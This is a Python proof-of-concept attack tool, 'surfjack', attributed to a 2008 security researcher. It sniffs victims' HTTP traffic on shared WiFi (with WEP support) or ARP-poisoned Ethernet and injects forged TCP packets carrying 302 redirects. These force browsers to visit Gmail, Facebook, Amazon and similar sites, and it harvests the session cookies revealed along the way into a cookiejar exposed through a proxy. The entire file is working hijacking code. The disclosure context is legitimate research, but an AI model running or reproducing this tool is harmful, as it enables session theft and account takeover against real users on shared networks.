#!/usr/bin/env python
# proof of concept by sandro gauci
# enablesecurity 2008 
# 20080809
# what it does: forces web browsers to go to specific sites. This has the effect
# of forcing these browsers to reveal the cookie. The attack needs to be launched
# from a network location that allows the attacker to view all traffic being sent
# by the victim. Examples of such locations are WiFi and Ethernet+ARP poisoning
#
# features:
#       - handles Ethernet connections (Use ettercap etc to poison ARP tables)
#       - handles WiFi connections with WEP support
#               (needs the card to be in monitor mode + allow packet injection)
#       - handles hosts which do not have port 80 open
from scapy import *
from helper import *
from proxy import DrukqsProxy
import anydbm
import logging


redirmsg = ["HTTP/1.1 302 Found",
                        "Location: %(url)s",
                        "Cache-Control: private",
                        "Content-Type: text/html; charset=UTF-8",
                        "Server: o_o",
                        "Content-Length: 0",
                        '',
                        '']

redirpkt = '\r\n'.join(redirmsg)
redirpkt += '\r\n'*100
hijacked = dict()

class tcpsessions:
        import logging
        def __init__(self):
                global victimheaders
                self.log = logging.getLogger('tcpsessions')
                self.log.debug('initialized tcpsessions()')
                self.packets = dict()
                self.victimheaders = victimheaders
        
        def addpacket(self,packet):
                if packet.haslayer(Raw):
                        self.log.debug('we have a packet with payload')
                        ipsrc = packet.getlayer(IP).src
                        ipdst = packet.getlayer(IP).dst
                        seq = packet.getlayer(TCP).seq
                        ack = packet.getlayer(TCP).ack
                        k = ipsrc,ipdst,ack
                        if self.packets.has_key(k):
                                self.log.debug('adding to previous packet (fragmented) %s' % str(k))
                                self.packets[k] += packet.getlayer(Raw).load
                                self.log.debug(self.packets[k])
                        else:
                                self.log.debug('new packet, creating new session %s' % str(k))
                                self.packets[k] = packet.getlayer(Raw).load
                                self.log.debug(self.packets[k])
        
        def getcookies(self):
                cookies = dict()
                for k in self.packets.keys():
                        self.log.debug(self.packets[k])
                        cookie = getcookie(self.packets[k])
                        if cookie is not None:
                                h = gethost(self.packets[k])[0]
                                cookies[h] = cookie[0]                
                self.victimheaders.update( parseHeader(self.packets[k],'request')['headers'] )
                return(cookies)
        
        
                

def http_monitor_callback(pkt):
        """handle each packet that matches the filter. This is where all the
        logic is"""
        packetbasket = list()        
        log = logging.getLogger('http_monitor_callback')
        if pkt.haslayer(TCP):
                if pkt.haslayer(Dot11):
                        uid = pkt.getlayer(Dot11).addr2
                elif pkt.haslayer(Ether):
                        uid = pkt.getlayer(Ether).src
                else:
                        self.log.error('protocol neither ethernet nor wifi - need to add support')
                        return
                if hijacked.has_key(uid):
                        if hijacked[uid]['closed']:
                                log.debug('uid:%s is closed - skipping' % uid)
                                return
                                
                if uid in ignoreethersrc:
                        log.debug('this is an ignored ethernet src')
                        return
                if pkt.haslayer(Dot11):
                        log.debug('building an 802.11 packet for you')
                        l2 = Dot11(addr1=pkt.getlayer(Dot11).addr2,
                                   addr2=pkt.getlayer(Dot11).addr1,
                                   addr3=pkt.getlayer(Dot11).addr3, 
                                   FCfield="from-DS"
                                   ) / \
                                LLC() / \
                                SNAP()
                elif pkt.haslayer(Ether):
                        log.debug('building an Ethernet packet for you')
                        l2 = Ether(dst=pkt.getlayer(Ether).src,src=pkt.getlayer(Ether).dst)
                else:
                        self.log.critical('protocol neither ethernet nor wifi - need to add support - please let me know about this')
                        return
                l3 = IP(src=pkt.getlayer(IP).dst, dst=pkt.getlayer(IP).src)
                l4 = TCP(dport=pkt.getlayer(TCP).sport,sport=pkt.getlayer(TCP).dport)
                log.debug('ethernet src: %s' % (uid))

                if pkt.getlayer(IP).dst in hijackwholeconnection:
                        if pkt.getlayer(TCP).flags == 2:
                                log.debug("syn packet - time to hijack this connection")
                                # SYN .. handle it
                                pktreply = l2 / l3 / l4
                                pktreply.getlayer(TCP).ack=pkt.getlayer(TCP).seq+1
                                pktreply.getlayer(TCP).flags='SA'
                                packetbasket = [pktreply]
                
                if pkt.getlayer(TCP).flags == 24 or pkt.getlayer(TCP).flags == 16:
                        # psh ack
                        if pkt.haslayer(Raw):
                                log.debug('got some data')            
                                tcpdata = pkt.getlayer(Raw).load
                                tcpsess.addpacket(pkt)
                                nextdestination = None
                                if tcpdata.startswith("GET "):
                                        log.debug('tcpdata starts with GET')
                                        dsturl = getdsturl(tcpdata)
                                        log.info('destination url in packet: %s'% dsturl)                                        
                                        if dsturl in hijackdomains:
                                                nextpos = hijackdomains.index(dsturl) + 1
                                                if nextpos >= len(hijackdomains):
                                                        nextdestination = hijacked[uid]['originaldestination']
                                                else:
                                                        nextdestination = hijackdomains[nextpos]
                                                log.info('dsturl %s in hijackdomains; next destination: %s' % (dsturl,nextdestination))
                                        
                                        if not hijacked.has_key(uid):
                                                log.info('first time that we see %s' % uid)
                                                hijacked[uid] = dict()
                                                hijacked[uid]['originaldestination'] = dsturl
                                                hijacked[uid]['closed'] = False
                                        elif dsturl == hijacked[uid]['originaldestination']:
                                                        hijacked[uid]['closed'] = True
                                                        log.info('closing up')
                                                        cookiejar.update(tcpsess.getcookies())                                                        
                                                        log.info('cookiejar: %s' % str(cookiejar))
                                        if nextdestination is None:
                                                nextdestination = hijackdomains[0]
                                        if nextdestination is not None:
                                                log.debug('nextdestination is %s' % nextdestination)
                                                credirpkt = redirpkt % {'url': nextdestination }
                                                pktreply = l2/ l3 / l4
                                                pktreply.getlayer(TCP).seq = pkt.getlayer(TCP).ack
                                                pktreply.getlayer(TCP).ack = pkt.getlayer(TCP).seq+len(tcpdata)
                                                pktreply.getlayer(TCP).flags = "PA"                                                
                                                finpkt = pktreply.copy()
                                                pktreply.getlayer(TCP).add_payload(credirpkt)
                                                finpkt.getlayer(TCP).flags="FA"
                                                finpkt.getlayer(TCP).seq += len(credirpkt)                                                
                                                packetbasket = [pktreply,finpkt]
                                                log.debug('src = %s ; dst = %s' % (pkt.getlayer(IP).dst,pkt.getlayer(IP).src))
                                                log.info('sent redirect to %s' % nextdestination)
                                else:
                                        log.debug('not a GET request')
                elif pkt.getlayer(TCP).flags == 17:
                        # fin ack
                        log.debug('handling fin packets')
                        pktreply = l2 / l3 / l4
                        pktreply.getlayer(TCP).ack=pkt.getlayer(TCP).seq+1
                        pktreply.getlayer(TCP).seq=pkt.getlayer(TCP).ack
                        pktreply.getlayer(TCP).flags='FA'
                        packetbasket.append(pktreply)
                sendp(packetbasket,verbose=0, iface=injiface)

def getconfig(fn):
        from ConfigParser import ConfigParser
        import logging
        log = logging.getLogger('getconfig')
        configparser = ConfigParser()
        for x in xrange(3):
                if len(configparser.read(fn)) > 0:
                                break
                else:
                        defaultconfig = list()
                        defaultconfig.append('[surfjack]')
                        defaultconfig.append('site1=http://mail.google.com/')
                        defaultconfig.append('site2=http://myspace.com/')
                        defaultconfig.append('site3=http://www.facebook.com/')
                        defaultconfig.append('site4=http://www.amazon.com/')
                        defaultconfig.append('site5=http://www.skype.com/')
                        defaultconfig.append('site6=http://www.salesforce.com/')
                        defaultconfig.append('')
                        defaultconfig.append('[hijack]')
                        defaultconfig.append('ip1=1.1.1.1')
                        log.warn( "%s not found.. creating default" % fn )
                        _tmp = open(fn,'w')
                        _tmp.write('\r\n'.join(defaultconfig))
                        _tmp.write('\r\n')
                        _tmp.close()
                        continue
        r = list()
        for _section in ['surfjack','hijack']:
                if not configparser.has_section(_section):
                        log.critical('configuration does not have section %s' % _section)
                        return
                s = list()
                for _option in configparser.options(_section):
                        s.append(configparser.get(_section,_option))
                r.append(s)
        return r

if __name__ == "__main__":
        from optparse import OptionParser
        o = OptionParser(usage="just run %prog. use --help to print out the help")
        o.add_option('-i',help='specify an interface', dest="interface")
        o.add_option('-v', help="increase verbosity", dest='verbose', action='count' )
        o.add_option('-q', help="quiet mode", dest='quiet', default=False, action='store_true' )
        o.add_option('-j', help="interface to use to inject packets with", dest="injiface")
        o.add_option('-W', help="WEP key", dest="wepkey")
        o.add_option('-c', help="Specify a custom configuration file", dest='config', default='surfjack.ini')
        o.add_option('--dontignoreself', help="Disable ignoring of own traffic", dest="ignoreself", default=True, action="store_false")
        options, args = o.parse_args()
        loglevel = calcloglevel(options)
        logging.basicConfig(level=loglevel)
        log = logging.getLogger()
        ignoreethersrc = list()
        _tmp = getconfig(options.config)
        if _tmp is None:
                sys.exit(1)
        hijackdomains,hijackwholeconnection = _tmp
        log.info('surfjacking the following sites: %s' % (' '.join(hijackdomains)))
        log.info('hijacking connections to the following ips: %s' % (' '.join(hijackwholeconnection))) 
        if options.interface is not None:
                log.debug('setting interface to %s' % options.interface)
                conf.iface = options.interface
        injiface = conf.iface
        if options.injiface is not None:
                injiface = options.injiface
        log.info('monitor interface: %s' % conf.iface)
        log.info('inject interface: %s' % injiface)
        if options.wepkey is not None:
                conf.wepkey = options.wepkey
        if options.ignoreself:
                try:
                        ignoreethersrc.append(get_if_hwaddr(conf.iface))
                except:
                        log.warn('could not add local address to the ignore list')
        cookiejar = dict()
        victimheaders = dict()
        proxy = DrukqsProxy()
        proxy.cookiejar = cookiejar
        proxy.victimheaders = victimheaders
        proxy.start()
        log.info('started proxy')
        tcpsess = tcpsessions()
        try:
                log.debug('sniffing')
                sniff(prn=http_monitor_callback, filter="tcp dst port 80", store=0)
        except socket.error:
                log.critical('could not run - probably a permissions problem')